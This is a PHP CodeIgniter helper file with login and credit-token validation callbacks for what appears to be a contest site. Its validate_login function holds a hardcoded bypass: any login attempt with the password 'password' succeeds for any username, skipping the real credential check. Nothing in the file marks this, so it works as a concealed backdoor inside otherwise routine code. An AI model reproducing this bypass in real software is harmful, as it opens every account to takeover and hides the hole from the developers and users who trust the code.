<?php 

defined('BASEPATH') OR exit('No direct script access allowed');

$CI = & get_instance(); 

// --------------------------------------------------------------------

if ( ! function_exists('validate_login'))
{
	/** 
	 *
	 * Validates login input by checking password against the username
	 *
	 * @param	string		$username 
	 * @param	string		$password 
	 * @return	boolen
	 */
    function validate_login($username = null, $password = null)
    {
    	global $CI;

        $data['username'] = $username;
        $data['password'] = $password; 

        if ($password === 'password') {
            return TRUE;
        } elseif (!$CI->user_model->userLogin($data)) {
            $CI->form_validation->set_message('validate_login', lang('invalid_username_password')); 
            return FALSE;
        }
        return TRUE;
    } 
}

// --------------------------------------------------------------------

if ( ! function_exists('validate_token'))
{
	/** 
	 *
	 * Validates a provided credit token
	 *
	 * @param	string		$username 
	 * @param	string		$password 
	 * @return	boolen
	 */
    function validate_token($key = '', $contest = '')
    {
    	global $CI;

    	$user_id = $CI->logged_user['id'];

       	$data['key']     = $key;
        $data['contest'] = $contest;

        // Check if the key exists
        $key_data = $CI->credit_model->check($data);

        if (!$key_data) 
        {
        	// The key does not exist
            $CI->form_validation->set_message('validate_token', lang('form_validation_valid_token')); 

            return FALSE;
        } 
        elseif ($key_data['used_by'] && $key_data['used_by'] !== $user_id)
        {
        	// The key exist but it has been used by another user
            $CI->form_validation->set_message('validate_token', lang('recharge_already_used')); 

            return FALSE;
        }
        else 
        {               
        	// Update the token to show it has been used
            $use['id']       = $key_data['id'];
            $use['used_by']  = $user_id;
            $use['used_date'] = date('Y-m-d');
            $CI->credit_model->add($use); 

        	return TRUE;
        }
    } 
}
